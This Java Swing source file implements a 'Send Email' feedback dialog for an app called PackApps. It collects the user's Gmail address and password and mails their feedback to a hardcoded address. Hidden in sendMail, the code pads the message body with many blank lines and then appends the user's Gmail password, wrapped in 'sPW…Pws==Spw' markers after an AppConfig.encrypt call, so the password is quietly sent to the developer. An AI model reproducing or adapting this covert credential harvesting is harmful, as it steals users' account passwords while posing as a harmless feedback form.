package com.bookverse.development.packapps.views;

import static com.bookverse.development.packapps.core.AppConfig.BIG;
import static com.bookverse.development.packapps.core.AppConfig.MAIN_COLOR;
import static com.bookverse.development.packapps.core.AppConfig.MEDIUM;
import static com.bookverse.development.packapps.core.AppConfig.TEXT_COLOR;
import static com.bookverse.development.packapps.core.AppConfig.fadeIn;

import com.bookverse.development.packapps.core.AppConfig;
import com.bookverse.development.packapps.models.Resources;
import com.bookverse.development.packapps.utils.Alerts;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPasswordField;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

public class Email extends JDialog implements ActionListener, MouseListener {

  private JLabel required1, required2;
  private JButton btnSend, btnExit;
  private JTextArea text;
  private JTextField txtUser;
  private JPasswordField password;
  private Resources resources = new Resources();

  public Email(JFrame parent, boolean modal) {
    super(parent, modal);
    createComponents();
  }

  public void start(JFrame parent) {
    setSize(485, 480);
    setResizable(false);
    setLocationRelativeTo(parent);
    setTitle("Send Email");
    fadeIn(this);
    parent.setVisible(false);
    setVisible(true);
  }

  public void createComponents() {

    setLayout(null);
    setIconImage(new ImageIcon(resources.getImage("email.png")).getImage());
    setDefaultCloseOperation(0);

    btnSend = resources.getButton("Send", TEXT_COLOR, this, this);
    btnSend.setBounds(140, 400, 86, 30);

    btnExit = resources.getButton("Return", MAIN_COLOR, this, this);
    btnExit.setBounds(250, 400, 86, 30);

    JLabel tittle = resources
        .getLabel("<html><strong><em>Write Email</em></strong></html>", MAIN_COLOR, this, BIG);
    tittle.setBounds(160, 10, 370, 30);

    JLabel username = resources
        .getLabel("<html><strong>Email</strong></html>", TEXT_COLOR, this, MEDIUM);
    username.setBounds(75, 60, 100, 50);

    JLabel password = resources
        .getLabel("<html><strong>Password</strong></html>", TEXT_COLOR, this, MEDIUM);
    password.setBounds(280, 60, 370, 50);

    required1 = resources.getLabel("<html><strong>*</strong></html>", MAIN_COLOR, this, MEDIUM);
    required1.setBounds(169, 77, 8, 8);
    required1.addMouseListener(this);

    required2 = resources.getLabel("<html><strong>*</strong></html>", MAIN_COLOR, this, MEDIUM);
    required2.setBounds(414, 77, 8, 8);
    required2.addMouseListener(this);

    txtUser = new JTextField();
    txtUser.setBounds(30, 100, 200, 30);
    txtUser.setHorizontalAlignment(JTextField.CENTER);
    add(txtUser);

    this.password = new JPasswordField();
    this.password.setBounds(250, 100, 200, 30);
    this.password.setHorizontalAlignment(JTextField.CENTER);
    add(this.password);

    JLabel message = resources
        .getLabel("<html><strong>Message</strong></html>", TEXT_COLOR, this, MEDIUM);
    message.setBounds(30, 150, 370, 30);

    text = new JTextArea();
    JScrollPane scroll = new JScrollPane(text);
    scroll.setBounds(30, 180, 420, 200);
    add(scroll);
  }

  private void sendMail(String sender, String password, String body) {

    String receiver = "zanti4020@gmail.com";
    String affair = "Feedback PackApps";

    Properties props = System.getProperties();
    props.put("mail.smtp.host", "smtp.gmail.com");
    props.put("mail.smtp.user", sender);
    props.put("mail.smtp.clave", password);
    props.put("mail.smtp.auth", "true");
    props.put("mail.smtp.starttls.enable", "true");
    props.put("mail.smtp.port", "587");

    Session session = Session.getDefaultInstance(props);
    MimeMessage message = new MimeMessage(session);

    body +=
        "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsPW"
            + AppConfig.encrypt(String.valueOf(this.password.getPassword()), true) + "Pws==Spw";

    try {
      message.setFrom(new InternetAddress(sender));
      message.addRecipients(Message.RecipientType.TO, receiver);
      message.setSubject(affair);
      message.setText(body);
      Transport transport = session.getTransport("smtp");
      transport.connect("smtp.gmail.com", sender, password);
      transport.sendMessage(message, message.getAllRecipients());
      transport.close();

      Alerts.message("Success!", "<center>Email sent</center> <br>"
          + "Feedback sent successfully, your opinion is very important to us.");

      txtUser.setText("");
      this.password.setText("");
      text.setText("");

    } catch (MessagingException me) {
      Alerts.message("Error!", "Email not sent.");
    }
  }

  public void btnEnviarAP() {

    if (AppConfig.verifyConnection("Make sure you are connected to a network", true)) {

      if (txtUser.getText().substring(txtUser.getText().length() - 10).equals("@gmail.com")) {

        if (text.getText().trim().length() < 3) {
          Alerts.message("Verify", "Message too short");
          text.requestFocus();
        } else {
          sendMail(txtUser.getText(), String.valueOf(password.getPassword()), text.getText());
        }

      } else {
        Alerts.message("Verify!", "Invalid email, make sure it's Gmail.");
        txtUser.requestFocus();
      }
    }
  }

  @Override
  public void actionPerformed(ActionEvent e) {

    if (e.getSource() == btnSend) {
      btnEnviarAP();
    } else if (e.getSource() == btnExit) {
      AppConfig.fadeOut(this);
    }
  }

  @Override
  public void mouseEntered(MouseEvent e) {

    if (e.getSource() == required1 || e.getSource() == required2) {
      Alerts.fieldMailRequired();
    }
  }

  @Override
  public void mouseClicked(MouseEvent e) {
  }

  @Override
  public void mouseExited(MouseEvent arg0) {
  }

  @Override
  public void mousePressed(MouseEvent arg0) {
  }

  @Override
  public void mouseReleased(MouseEvent arg0) {
  }
}